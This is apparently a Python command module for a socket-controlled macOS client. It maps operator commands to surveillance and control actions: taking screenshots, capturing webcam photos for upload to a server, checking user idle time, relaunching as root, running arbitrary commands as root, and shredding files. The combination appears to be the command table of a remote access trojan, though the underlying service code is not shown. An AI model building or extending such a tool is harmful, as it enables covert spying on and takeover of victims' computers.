from client.commands.arguments.decorators import argument_command
from client.commands.common.commands import CommonCommands
from client.commands.platform.services.mac.automation_service import MacAutomationService
from client.commands.platform.services.mac.file_inspection_service import MacFileInspectionService
from client.commands.platform.services.mac.media_service import MacMediaService
from client.commands.platform.services.mac.system_service import MacSystemService
from client.commands.platform.specs.mac import *
from client.commands.platform.specs.common import NETSTAT_ARGUMENT_SPEC, PS_ARGUMENT_SPEC
from core.utils.decorator import desc
from core.utils.logger import logger


class MacCommands(CommonCommands):
    """macOS 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)
        self.mac_system = MacSystemService(self)
        self.mac_media = MacMediaService(self)
        self.mac_automation = MacAutomationService(self)
        self.mac_file_inspection = MacFileInspectionService(self)

    @desc("Capture a screenshot", group='media')
    def screenshot(self):
        return self.mac_media.capture_screenshot()

    @desc('Show system information', group='system')
    def getinfo(self, arg=''):
        try:
            return self.mac_system.collect_system_info(arg)
        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to collect system information: {e}'

    @desc('Show user idle time', group='system')
    def idletime(self):
        return self.mac_system.get_idle_time()

    @desc('Capture webcam photo', group='media')
    def webcam_snap(self):
        """拍照并上传到服务器"""
        return self.mac_media.capture_webcam_photo()

    @desc('Launch a new instance with elevated privileges', group='privilege')
    def spawn_elevated_instance(self):
        """以 root 权限启动新实例，返回 PID"""
        return self.mac_automation.sudo_self()

    @desc('Run a command with elevated privileges', group='privilege')
    def run_elevated(self, command):
        """以 root 权限执行命令 (macOS)"""
        return self.mac_automation.sudo_run(command)

    @desc('Securely delete file (overwrite)', group='file')
    def file_shred(self, path):
        """安全删除文件（覆写后删除）"""
        return self.mac_file_inspection.secure_delete_file(path)

    @argument_command('msgbox', spec=MSGBOX_ARGUMENT_SPEC)
    def _acmd_msgbox(self, args_dict, payload=None):
        return self.mac_automation.acmd_msgbox(args_dict, payload)

    @argument_command('notify', spec=NOTIFY_ARGUMENT_SPEC)
    def _acmd_notify(self, args_dict, payload=None):
        return self.mac_automation.acmd_notify(args_dict, payload)

    @argument_command('sqlite_query', spec=SQLITE_QUERY_SPEC)
    def _acmd_sqlite_query(self, args_dict, payload=None):
        """只读 SQLite 查询"""
        return self.mac_file_inspection.acmd_sqlite_query(args_dict, payload)

    @argument_command('image_info', spec=IMAGE_INFO_SPEC)
    def _acmd_image_info(self, args_dict, payload=None):
        """获取图片信息"""
        return self.mac_file_inspection.acmd_image_info(args_dict, payload)

    @argument_command('import_check', spec=IMPORT_CHECK_SPEC)
    def _acmd_import_check(self, args_dict, payload=None):
        """检查 Python 包是否可以导入"""
        return self.mac_file_inspection.acmd_import_check(args_dict, payload)

    @argument_command('archive_peek', spec=ARCHIVE_PEEK_SPEC)
    def _acmd_archive_peek(self, args_dict, payload=None):
        """查看压缩包内容"""
        return self.mac_file_inspection.acmd_archive_peek(args_dict, payload)

    @argument_command('netstat', spec=NETSTAT_ARGUMENT_SPEC)
    def _acmd_netstat(self, args_dict, payload=None):
        return self._acmd_netstat_common(args_dict, payload)

    @argument_command('ps', spec=PS_ARGUMENT_SPEC)
    def _acmd_ps(self, args_dict, payload=None):
        return self._acmd_ps_common(args_dict, payload)